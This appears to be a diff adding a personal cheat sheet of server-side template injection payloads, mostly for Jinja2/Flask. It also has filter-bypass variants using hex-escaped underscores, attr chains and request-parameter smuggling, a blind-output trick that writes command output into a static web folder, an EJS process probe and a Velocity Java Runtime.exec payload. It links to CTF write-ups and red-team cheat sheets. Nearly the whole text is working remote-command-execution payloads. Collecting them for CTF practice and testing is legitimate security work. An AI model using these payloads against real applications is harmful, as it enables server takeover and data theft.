@@ -1,0 +1,39 @@
+
+https://hackmd.io/@Chivato/HyWsJ31dI
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('Is').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+{{lipsum.__globals__.os.popen('<cmd>').read()}}
+---------without .
+{{lipsum["__globals__"]["os"]["popen"]("ls")["read"]()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+----------------------------------blocks “.” and “_”:
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+
+--------------------------------- blocks on “.”, “_”, “[]”
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+----------------------------------without using {{}}
+{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() == 'chiv\n' %} a {% endif %}
+{% set bla = lipsum.__globals__['os'].popen('ls / > /home/service/static/output.txt').read() %}
+
+------------------------------------------filter word
+{{['Thi','s wi','ll b','e appended']|join}}
+?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
+
+---------------------------------other
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+-----------------------------------------blind output
+https://hackmd.io/@Chivato/HyWsJ31dI
+
+https://hackmd.io/@to016/imaginaryCTF2022 -- minigolf
+https://programmer.group/ctfshow-question-brushing-diary-web-ssti-web361-372.html
+---example https://hackmd.io/@Trumpiter/basicvulnweb
+----------------------------------------------------------NODEJS
+<%=JSON.stringify(process)%>  kiểm tra giá trị process
+https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet
+----------------------------------------------------------payload
+{{['ls']|map('system')|join}}
+--------------------------------------------------java
+#set ($e="bla")
+$e.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
